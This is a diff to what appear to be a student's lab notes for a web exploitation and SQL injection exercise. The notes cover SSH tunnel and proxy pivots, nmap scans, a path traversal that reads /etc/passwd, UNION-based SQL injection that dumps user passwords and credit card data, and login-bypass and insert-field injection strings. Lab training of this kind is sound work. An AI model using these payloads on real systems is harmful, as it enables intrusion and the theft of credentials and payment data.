@@ -1,3 +1,7 @@
+#############################
+      Web Exploitation
+#############################
+
 ssh student@10.50.39.165 -L 3001:localhost:22 -NT
 ssh -p 3001 student@localhost -D 9050 -NT
   proxychains nmap -Pn 10.100.28.40 -T4
@@ -25,3 +29,28 @@ firefox
     go to console
       type javascript:win_the_game()
   http://localhost:3004/books_pick.php?book=?../../../../../../../../../../../etc/passwd
+
+#############################
+        SQL INJECTION
+#############################
+1. ssh student@10.50.39.165 -L 3001:localhost:22 -NT
+2. ssh -p 3001 student@localhost -D 9050 -NT
+  proxychains nmap -Pn 10.100.28.48 -T4
+  proxychains nmap nmap -v -sT -Pn -T4 --script discovery 10.100.28.40 -p 80
+3. ssh -p 3001 student@localhost -L 3002:10.100.28.48:80 -NT
+4. Open firefox
+  localhost:3002
+5. Under Categories
+  in url type OR 1=1 at the end of URL
+  now type UNION select 1,2,3 ; at the end of URL
+  now type select table_schema, table_name, column_name FROM information_schema.columns at the end of URL
+  now type UNION select username,email,password FROM sqlinjection.members at the end of the url
+  now type UNION select 1,2,@@version
+  now type UNION select creditcard_number,date,id FROM sqlinjection.payments
+  now type UNION select comment,data,id FROM sqlinjection.share4
+6. Under Search
+  type tom' OR 1='1
+7. Under Register 
+  submit a baseline in which it will give you a baseline query
+  In the Username box submit
+    hackerdude1', 'password', 'doesitmatter', 3) 
